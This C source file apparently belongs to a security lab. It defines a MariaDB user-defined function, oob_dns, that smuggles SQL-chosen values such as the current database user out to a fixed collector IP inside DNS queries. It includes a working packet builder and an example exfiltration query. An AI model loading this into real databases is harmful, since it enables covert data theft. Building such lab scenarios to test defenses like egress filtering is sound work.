/*
 * oob_dns — a loadable MariaDB UDF for the out-of-band SQLi scenario.
 *
 * This is the deliberately-weak capability the OOB attack needs: once loaded,
 * SQL can make the DATABASE ITSELF emit a DNS query, with a stolen value folded
 * into the queried hostname; the database is turned into a courier. The
 * attacker reads the secret out of the collector's query log.
 *
 *   SELECT oob_dns(CONCAT(current_user(), '.oob.lab'));
 *     -> DB sends a DNS A query for "portal@172.x.oob.lab" to the collector,
 *        which logs the name; the leaked user is the first label.
 *
 * It sends the query straight to a fixed collector IP (the oobsvc node), so it
 * needs no resolver configuration on the DB. That one outbound UDP packet is
 * exactly what the egress-control defense drops.
 *
 * Self-contained: the MySQL/MariaDB UDF ABI structs are declared here, so this
 * compiles with a plain `gcc -shared -fPIC` and no server/client dev headers.
 */
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

/* --- Minimal UDF ABI (stable; mirrors <mysql.h>) ------------------------- */
typedef char my_bool;

enum Item_result {
    STRING_RESULT = 0, REAL_RESULT, INT_RESULT,
    ROW_RESULT, DECIMAL_RESULT, TIME_RESULT
};

typedef struct st_udf_args {
    unsigned int   arg_count;
    enum Item_result *arg_type;
    char         **args;
    unsigned long *lengths;
    char          *maybe_null;
    char         **attributes;
    unsigned long *attribute_lengths;
    void          *extension;
} UDF_ARGS;

typedef struct st_udf_init {
    my_bool        maybe_null;
    unsigned int   decimals;
    unsigned long  max_length;
    char          *ptr;
    my_bool        const_item;
    void          *extension;
} UDF_INIT;

/* --- Collector target (the oobsvc node on app-net) ----------------------- */
#define OOB_COLLECTOR_IP   "172.31.0.40"
#define OOB_COLLECTOR_PORT 53

my_bool oob_dns_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "oob_dns() requires exactly one string argument");
        return 1;
    }
    initid->maybe_null = 1;
    initid->max_length = 32;
    return 0;
}

void oob_dns_deinit(UDF_INIT *initid) { (void)initid; }

char *oob_dns(UDF_INIT *initid, UDF_ARGS *args, char *result,
              unsigned long *length, char *is_null, char *error)
{
    (void)initid; (void)error;

    const char   *name = args->args[0];
    unsigned long nlen = args->lengths[0];
    if (name == NULL || nlen == 0) { *is_null = 1; return result; }

    /* Build a DNS A query: 12-byte header, QNAME as length-prefixed labels, A/IN. */
    unsigned char pkt[600];
    unsigned int  p = 0;
    pkt[p++] = 0x13; pkt[p++] = 0x37;   /* transaction id              */
    pkt[p++] = 0x01; pkt[p++] = 0x00;   /* flags: standard query, RD   */
    pkt[p++] = 0x00; pkt[p++] = 0x01;   /* QDCOUNT = 1                 */
    pkt[p++] = 0x00; pkt[p++] = 0x00;   /* ANCOUNT                     */
    pkt[p++] = 0x00; pkt[p++] = 0x00;   /* NSCOUNT                     */
    pkt[p++] = 0x00; pkt[p++] = 0x00;   /* ARCOUNT                     */

    unsigned long i = 0;
    while (i < nlen && p < sizeof(pkt) - 6) {
        unsigned long start = i;
        while (i < nlen && name[i] != '.') i++;
        unsigned long labellen = i - start;
        if (labellen > 63) labellen = 63;            /* DNS label cap */
        pkt[p++] = (unsigned char)labellen;
        for (unsigned long k = 0; k < labellen && p < sizeof(pkt) - 6; k++)
            pkt[p++] = (unsigned char)name[start + k];
        if (i < nlen && name[i] == '.') i++;          /* skip the dot  */
    }
    pkt[p++] = 0x00;                     /* root label (end of QNAME)  */
    pkt[p++] = 0x00; pkt[p++] = 0x01;   /* QTYPE  = A                  */
    pkt[p++] = 0x00; pkt[p++] = 0x01;   /* QCLASS = IN                 */

    const char *status = "sent";
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        status = "sock-fail";
    } else {
        struct sockaddr_in dst;
        memset(&dst, 0, sizeof(dst));
        dst.sin_family      = AF_INET;
        dst.sin_port        = htons(OOB_COLLECTOR_PORT);
        dst.sin_addr.s_addr = inet_addr(OOB_COLLECTOR_IP);
        if (sendto(s, pkt, p, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
            status = "send-fail";
        close(s);
    }

    unsigned long rl = strlen(status);
    memcpy(result, status, rl);
    *length = rl;
    return result;
}
